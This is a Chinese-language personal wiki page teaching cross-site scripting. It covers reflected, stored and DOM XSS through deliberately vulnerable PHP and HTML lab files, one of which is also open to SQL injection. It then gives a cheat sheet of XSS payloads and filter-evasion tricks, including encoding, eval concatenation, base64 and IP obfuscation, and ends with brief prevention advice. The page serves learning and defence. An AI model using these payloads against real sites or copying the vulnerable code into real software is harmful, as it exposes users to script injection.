<!DOCTYPE HTML>
<html>
<head>
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/style.css">
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/tango.css">
    <link rel="shortcut icon" href="/wiki/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/wiki/favicon.ico" type="image/x-icon">
    <title>XSS学习 - Curtails's personal knowledge wiki</title>
    <meta name="keywords" content="Technology, CTF, Network Security"/>
    <meta name="description" content="A wiki website of Curtails when I learned new knowledgy."/>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width" />

    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
        });
        </script>
    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','','ga');

        ga('create', 'UA-78529611-1', 'auto');
        ga('send', 'pageview');

    </script>
</head>

<body>
<div id="container">
    
<div id="header">
  <div id="post-nav"><a href="/wiki/">Home</a>&nbsp;»&nbsp;<a href="/wiki/#Web">Web</a>&nbsp;»&nbsp;XSS学习</div>
</div>
<div class="clearfix"></div>
<div id="title">XSS学习</div>
<div id="content">
  <div class="toc"><span class="toctitle">Table of Contents</span><ul>
<li><a href="#xss">xss基础</a></li>
<li><a href="#xss_1">xss漏洞原理</a><ul>
<li><a href="#xss_2">反射型XSS</a></li>
<li><a href="#xss_3">存储型XSS</a></li>
<li><a href="#domxss">DOM型XSS</a></li>
</ul>
</li>
<li><a href="#_1">环境</a></li>
<li><a href="#xss_4">反射型XSS</a><ul>
<li><a href="#_2">示例</a></li>
<li><a href="#_3">分析</a></li>
</ul>
</li>
<li><a href="#xss_5">存储型xss攻击</a><ul>
<li><a href="#_4">示例</a></li>
<li><a href="#_5">分析</a></li>
</ul>
</li>
<li><a href="#domxss_1">DOM型xss</a><ul>
<li><a href="#_6">示例</a></li>
<li><a href="#_7">分析</a></li>
</ul>
</li>
<li><a href="#xss_6">xss常用语句及绕过</a><ul>
<li><a href="#_8">常用标签</a></li>
<li><a href="#_9">过滤空格</a></li>
<li><a href="#_10">过滤关键字</a><ul>
<li><a href="#_11">大小写绕过</a></li>
<li><a href="#_12">双写关键字</a></li>
<li><a href="#_13">字符拼接</a></li>
<li><a href="#_14">其它字符混淆</a></li>
<li><a href="#_15">编码绕过</a><ul>
<li><a href="#html">HTML实体编码</a></li>
<li><a href="#url">URL编码</a></li>
<li><a href="#js">JS编码</a></li>
<li><a href="#stringfromcharcode">String.fromCharCode编码</a></li>
<li><a href="#base">base</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_16">过滤单引号双引号</a><ul>
<li><a href="#_17">反引号绕过</a></li>
<li><a href="#_18">编码</a></li>
</ul>
</li>
<li><a href="#_19">过滤括号</a></li>
<li><a href="#url_1">过滤url地址</a><ul>
<li><a href="#url_2">URL编码</a></li>
<li><a href="#ip">使用IP</a></li>
<li><a href="#_20">使用中文句号代替英文句号</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#xss_7">防止xss</a></li>
</ul>
</div>
<h1 id="xss">xss基础</h1>
<p>XSS 跨站脚本攻击 是一种<strong>代码注入</strong><br />
XSS攻击分为三种：反射型、存储型、DOM型</p>
<h1 id="xss_1">xss漏洞原理</h1>
<h2 id="xss_2">反射型XSS</h2>
<p>反射型又称非持久型XSS，攻击往往具有一次性<br />
攻击方式步骤： </p>
<ul>
<li>将包含xss代码发给目标用户</li>
<li>用户访问连接，对服务器发起请求</li>
<li>服务器响应将含有xss代码的数据返回目标用户浏览器</li>
<li>浏览器解析xss恶意代码，触发xss漏洞</li>
</ul>
<h2 id="xss_3">存储型XSS</h2>
<p>存储型又称持久型</p>
<h2 id="domxss">DOM型XSS</h2>
<p>一种特殊的反射型XSS，基于DOM文档对对象模型的漏洞<br />
特点：  </p>
<ul>
<li>通过js脚本通过DOM动态修改页面内容</li>
<li>
<p>发生在客户端，不与服务器交互<br />
攻击方式：</p>
</li>
<li>
<p>专门设计包含xss代码的URL</p>
</li>
<li>由攻击者提交</li>
<li>服务器的响应不以任何形式包含攻击者脚本</li>
<li>当用户浏览器处理响应，DOM对象处理xss代码</li>
<li>触发xss漏洞</li>
</ul>
<p><a href="https://blog.csdn.net/Bul1et/article/details/85091020">DOM型xss剖析</a></p>
<h1 id="_1">环境</h1>
<div class="hlcode"><pre><span class="p">.</span>
<span class="err">├──</span> <span class="n">xss1</span><span class="p">.</span><span class="n">php</span>
<span class="err">├──</span> <span class="n">xss2</span><span class="p">.</span><span class="n">php</span>
<span class="err">└──</span> <span class="n">xss3</span><span class="p">.</span><span class="n">php</span>
</pre></div>


<h1 id="xss_4">反射型XSS</h1>
<h2 id="_2">示例</h2>
<p>code/source/XSS/xss1.php<br />
关键代码：</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;xss_input_value&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&lt;input type=&quot;text&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;xss_input_value&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&lt;input type=&quot;text&quot; value=&quot;输出&quot;&gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>构造payload</p>
<div class="hlcode"><pre><span class="n">xss_input_value</span><span class="o">=</span><span class="s">&quot;&gt;&lt;img src=1 onerror=alert(xss)/&gt;</span>
</pre></div>


<h2 id="_3">分析</h2>
<p>payload发生步骤</p>
<ul>
<li>通过GET传参xss_input_value值</li>
<li>拼接成<code>&lt;input type="text" value=""&gt;&lt;img src=1 onerror=alert(xss)/&gt;"&gt;</code></li>
<li>echo输出img标签 触发xss</li>
</ul>
<h1 id="xss_5">存储型xss攻击</h1>
<h2 id="_4">示例</h2>
<p>code/source/xss/xss2.php<br />
关键代码：</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>
    <span class="nv">$con</span><span class="o">=</span><span class="nb">mysqli_connect</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="s2">&quot;root&quot;</span><span class="p">,</span><span class="s2">&quot;root&quot;</span><span class="p">,</span><span class="s2">&quot;test&quot;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">())</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;连接失败: &quot;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$result1</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span><span class="s2">&quot;insert into xss(`title`, `content`) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;,&#39;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;)&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$result2</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span><span class="s2">&quot;select * from xss&quot;</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;table border=&#39;1&#39;&gt;&lt;tr&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;内容&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result2</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>构造payload</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="mi">1</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="s">&quot;xss&quot;</span><span class="p">)</span> <span class="o">/&gt;</span>
</pre></div>


<h2 id="_5">分析</h2>
<ul>
<li>通过post传参将title与content值写入数据库</li>
<li>通过echo输出img标签 出发payload</li>
</ul>
<h1 id="domxss_1">DOM型xss</h1>
<p>注：DOM型xss不通过服务器响应，仅在本地执行  </p>
<h2 id="_6">示例</h2>
<p>code/source/xss/xss3.php<br />
关键代码：</p>
<div class="hlcode"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;Content-Type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html;charset=utf-8&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;title&gt;</span>Test<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
        <span class="kd">function</span> <span class="nx">tihuan</span><span class="p">(){</span>
            <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;id1&quot;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;dom_input&quot;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;center&gt;</span>
    <span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">&quot;id1&quot;</span><span class="nt">&gt;</span>这里会显示输入的内容<span class="nt">&lt;/h3&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">id=</span><span class="s">&quot;dom_input&quot;</span> <span class="na">value=</span><span class="s">&quot;输入&quot;</span><span class="nt">&gt;&lt;br</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;button&quot;</span> <span class="na">value=</span><span class="s">&quot;替换&quot;</span> <span class="na">onclick=</span><span class="s">&quot;tihuan()&quot;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;hr&gt;</span>

    <span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></div>


<p>同样payload</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="mi">1</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="s">&quot;xss&quot;</span><span class="p">)</span> <span class="o">/&gt;</span>
</pre></div>


<h2 id="_7">分析</h2>
<p>DOM型仅在本地执行所以没有服务器代码</p>
<ul>
<li>同过post传参提交参数（xss代码）</li>
<li>js脚本替换元素信息并执行xss代码</li>
</ul>
<h1 id="xss_6">xss常用语句及绕过</h1>
<p>参考：<br />
https://xz.aliyun.com/t/4067<br />
https://xz.aliyun.com/t/2936</p>
<h2 id="_8">常用标签</h2>
<div class="hlcode"><pre><span class="nt">&lt;scirpt&gt;</span>
<span class="nt">&lt;scirpt&gt;</span>alert(&quot;xss&quot;);<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;img&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">1</span> <span class="na">onerror=</span><span class="s">alert(&quot;xss&quot;);</span><span class="nt">&gt;</span>
<span class="nt">&lt;input&gt;</span>
<span class="nt">&lt;input</span> <span class="na">onfocus=</span><span class="s">&quot;alert(&#39;xss&#39;);&quot;</span><span class="nt">&gt;</span>
竞争焦点，从而触发onblur事件
<span class="nt">&lt;input</span> <span class="na">onblur=</span><span class="s">alert(&quot;xss&quot;)</span> <span class="na">autofocus</span><span class="nt">&gt;&lt;input</span> <span class="na">autofocus</span><span class="nt">&gt;</span>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<span class="nt">&lt;input</span> <span class="na">onfocus=</span><span class="s">&quot;alert(&#39;xss&#39;);&quot;</span> <span class="na">autofocus</span><span class="nt">&gt;</span>
<span class="nt">&lt;details&gt;</span>
<span class="nt">&lt;details</span> <span class="na">ontoggle=</span><span class="s">&quot;alert(&#39;xss&#39;);&quot;</span><span class="nt">&gt;</span>
使用open属性触发ontoggle事件，无需用户去触发
<span class="nt">&lt;details</span> <span class="na">open</span> <span class="na">ontoggle=</span><span class="s">&quot;alert(&#39;xss&#39;);&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;svg&gt;</span>
<span class="nt">&lt;svg</span> <span class="na">onload=</span><span class="s">alert(&quot;xss&quot;);</span><span class="nt">&gt;</span>
<span class="nt">&lt;select&gt;</span>
<span class="nt">&lt;select</span> <span class="na">onfocus=</span><span class="s">alert(1)</span><span class="nt">&gt;&lt;/select&gt;</span>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<span class="nt">&lt;select</span> <span class="na">onfocus=</span><span class="s">alert(1)</span> <span class="na">autofocus</span><span class="nt">&gt;</span>
<span class="nt">&lt;iframe&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">onload=</span><span class="s">alert(&quot;xss&quot;);</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;video&gt;</span>
<span class="nt">&lt;video&gt;&lt;source</span> <span class="na">onerror=</span><span class="s">&quot;alert(1)&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;audio&gt;</span>
<span class="nt">&lt;audio</span> <span class="na">src=</span><span class="s">x</span>  <span class="na">onerror=</span><span class="s">alert(&quot;xss&quot;);</span><span class="nt">&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;body</span><span class="err">/</span><span class="na">onload=</span><span class="s">alert(&quot;xss&quot;);</span><span class="nt">&gt;</span>
利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

<span class="nt">&lt;body</span>
<span class="na">onscroll=</span><span class="s">alert(&quot;xss&quot;);</span><span class="nt">&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input</span> <span class="na">autofocus</span><span class="nt">&gt;</span>
<span class="nt">&lt;textarea&gt;</span>
<span class="nt">&lt;textarea</span> <span class="na">onfocus=</span><span class="s">alert(&quot;xss&quot;);</span> <span class="na">autofocus</span><span class="nt">&gt;</span>
<span class="nt">&lt;keygen&gt;</span>
<span class="nt">&lt;keygen</span> <span class="na">autofocus</span> <span class="na">onfocus=</span><span class="s">alert(1)</span><span class="nt">&gt;</span> //仅限火狐
<span class="nt">&lt;marquee&gt;</span>
<span class="nt">&lt;marquee</span> <span class="na">onstart=</span><span class="s">alert(&quot;xss&quot;)</span><span class="nt">&gt;&lt;/marquee&gt;</span> //Chrome不行，火狐和IE都可以
<span class="nt">&lt;isindex&gt;</span>
<span class="nt">&lt;isindex</span> <span class="na">type=</span><span class="s">image</span> <span class="na">src=</span><span class="s">1</span> <span class="na">onerror=</span><span class="s">alert(&quot;xss&quot;)</span><span class="nt">&gt;</span>//仅限于IE

利用link远程包含js文件
PS：在无CSP的情况下才可以
<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">import</span> <span class="na">href=</span><span class="s">&quot;http://127.0.0.1/1.js&quot;</span><span class="nt">&gt;</span>
javascript伪协议
<span class="nt">&lt;a&gt;</span>标签

<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;javascript:alert(`xss`);&quot;</span><span class="nt">&gt;</span>xss<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;iframe&gt;</span>标签

<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">javascript:alert(&#39;xss&#39;);</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;img&gt;</span>标签

<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">javascript:alert(&#39;xss&#39;)</span><span class="nt">&gt;</span>//IE7以下
<span class="nt">&lt;form&gt;</span>标签

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;Javascript:alert(1)&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">submit</span><span class="nt">&gt;</span>
</pre></div>


<h2 id="_9">过滤空格</h2>
<p>用<code>/</code>代替空格</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span><span class="o">/</span><span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span><span class="o">/</span><span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="s">&quot;xss&quot;</span><span class="p">);</span><span class="o">&gt;</span>
</pre></div>


<h2 id="_10">过滤关键字</h2>
<h3 id="_11">大小写绕过</h3>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">ImG</span> <span class="n">sRc</span><span class="o">=</span><span class="n">x</span> <span class="n">onerRor</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="s">&quot;xss&quot;</span><span class="p">);</span><span class="o">&gt;</span>
</pre></div>


<h3 id="_12">双写关键字</h3>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">imimgg</span> <span class="n">srsrcc</span><span class="o">=</span><span class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="s">&quot;xss&quot;</span><span class="p">);</span><span class="o">&gt;</span>
</pre></div>


<h3 id="_13">字符拼接</h3>
<p>利用eval</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;a=`aler`;b=`t`;c=&#39;(`xss`);&#39;;eval(a+b+c)&quot;</span><span class="o">&gt;</span>
</pre></div>


<p>利用top</p>
<div class="hlcode"><pre><span class="nt">&lt;script&gt;</span>top<span class="cp">[</span><span class="s2">&quot;al&quot;</span><span class="o">+</span><span class="s2">&quot;ert&quot;</span><span class="cp">]</span>(`xss`);<span class="nt">&lt;/script&gt;</span>
</pre></div>


<h3 id="_14">其它字符混淆</h3>
<p>waf利用正则检测是否存在xss攻击 我们则要fuzz出正则规则<br />
简单例子:</p>
<div class="hlcode"><pre><span class="nx">可利用注释</span><span class="err">、</span><span class="nx">标签的优先级等</span>
<span class="mi">1</span><span class="nx">.</span><span class="o">&lt;&lt;</span><span class="nb">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;xss&quot;</span><span class="p">);</span><span class="c1">//&lt;&lt;/script&gt;</span>
<span class="mi">2</span><span class="nx">.</span><span class="o">&lt;</span><span class="nb">title</span><span class="o">&gt;&lt;</span><span class="nb">img</span> <span class="n">src</span><span class="o">=&lt;/</span><span class="nb">title</span><span class="o">&gt;&gt;&lt;</span><span class="nb">img</span> <span class="n">src</span><span class="o">=</span><span class="nx">x</span> <span class="n">onerror</span><span class="o">=</span><span class="s2">&quot;alert(`xss`);&quot;</span><span class="o">&gt;</span> <span class="c1">//因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span>
<span class="mi">3</span><span class="nx">.</span><span class="o">&lt;</span><span class="nb">SCRIPT</span><span class="o">&gt;</span><span class="kd">var</span> <span class="n">a</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;xss&quot;</span><span class="p">);</span><span class="c1">//&quot;;&lt;/SCRIPT&gt;</span>
</pre></div>


<h3 id="_15">编码绕过</h3>
<h4 id="html">HTML实体编码</h4>
<ul>
<li>命名实体 <code>&amp;lt;</code>为<code>&lt;</code></li>
<li>字符编码 <code>&amp;#数值</code></li>
</ul>
<h4 id="url">URL编码</h4>
<p>使用全编码即两次编码<br />
如alert的url全编码为<code>%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>
<h4 id="js">JS编码</h4>
<p>JS提供了四种字符编码的策略，</p>
<ul>
<li>三个八进制数字，如果数字不够，在前面补零，如a的编码为\141</li>
<li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为\x61</li>
<li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为\u0061</li>
<li>对于一些控制字符，使用特殊的C类型的转义风格，如\n和\r</li>
</ul>
<h4 id="stringfromcharcode">String.fromCharCode编码</h4>
<p>如alert的编码为String.fromCharCode(97,108,101,114,116)</p>
<h4 id="base">base</h4>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;</span><span class="o">&gt;</span>  
<span class="o">&lt;</span><span class="n">iframe</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span><span class="o">&gt;</span>
</pre></div>


<h2 id="_16">过滤单引号双引号</h2>
<h3 id="_17">反引号绕过</h3>
<p>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="err">`</span><span class="n">xss</span><span class="err">`</span><span class="p">);</span><span class="o">&gt;</span>
</pre></div>


<h3 id="_18">编码</h3>
<p>同关键字编码绕过</p>
<h2 id="_19">过滤括号</h2>
<p>当括号被过滤的时候可以使用throw来绕过</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="s">&quot;window.onerror=eval;throw&#39;=alert</span><span class="se">\x281\x29</span><span class="s">&#39;;&quot;</span><span class="o">&gt;</span>
</pre></div>


<h2 id="url_1">过滤url地址</h2>
<h3 id="url_2">URL编码</h3>
<p>不再赘述</p>
<h3 id="ip">使用IP</h3>
<p>IP地址进制转换：<br />
例如127.0.0.1 先转化成十六进制<code>7F000001</code>在转换成其他进制<br />
- 十进制IP</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="n">document</span><span class="p">.</span><span class="n">location</span><span class="o">=</span><span class="err">`</span><span class="n">http</span><span class="o">:</span><span class="c1">//2130706433/`&gt;</span>
</pre></div>


<ul>
<li>八进制IP</li>
</ul>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="n">document</span><span class="p">.</span><span class="n">location</span><span class="o">=</span><span class="err">`</span><span class="n">http</span><span class="o">:</span><span class="c1">//0177.0.0.01/`&gt;</span>
</pre></div>


<ul>
<li>十六进制</li>
</ul>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="n">document</span><span class="p">.</span><span class="n">location</span><span class="o">=</span><span class="err">`</span><span class="n">http</span><span class="o">:</span><span class="c1">//0x7f.0x0.0x0.0x1/`&gt;</span>
</pre></div>


<ul>
<li>html标签使用<code>//</code>可以代替<code>http://</code></li>
</ul>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="n">document</span><span class="p">.</span><span class="n">location</span><span class="o">=</span><span class="err">`</span><span class="c1">//www.baidu.com`&gt;</span>
</pre></div>


<ul>
<li>使用<code>\\</code> 在linux下可代替<code>http://</code></li>
</ul>
<div class="hlcode"><pre><span class="err">\\</span><span class="n">www</span><span class="p">.</span><span class="n">baidu</span><span class="p">.</span><span class="n">com</span> 
<span class="err">\\</span><span class="n">E</span><span class="o">:/</span><span class="n">code</span><span class="o">/</span><span class="n">xxx</span><span class="p">.</span><span class="n">txt</span> <span class="err">在</span><span class="n">windows</span><span class="err">为</span><span class="n">file</span><span class="err">协议读取文件</span>
</pre></div>


<h3 id="_20">使用中文句号代替英文句号</h3>
<p><code>。</code>会被浏览器转化为<code>.</code></p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;document.location=`http://www。baidu。com`&quot;</span><span class="o">&gt;</span><span class="c1">//会自动跳转到百度</span>
</pre></div>


<h1 id="xss_7">防止xss</h1>
<ul>
<li>过滤一些危险字符，以及转义&amp; &lt; &gt; " ' /等危险字符</li>
<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li>
<li>设置CSP(Content Security Policy)</li>
<li>输入内容长度限制</li>
</ul>
</div>
<div id="content-footer"></div>

</div>
<div id="footer">
            <span>
                Copyright © 2019 Curtails.
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
                Fork me in <a href="" target="_blank"> github </a>.
            </span>
</div>


<!--百度统计-->
<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>


</body>
</html>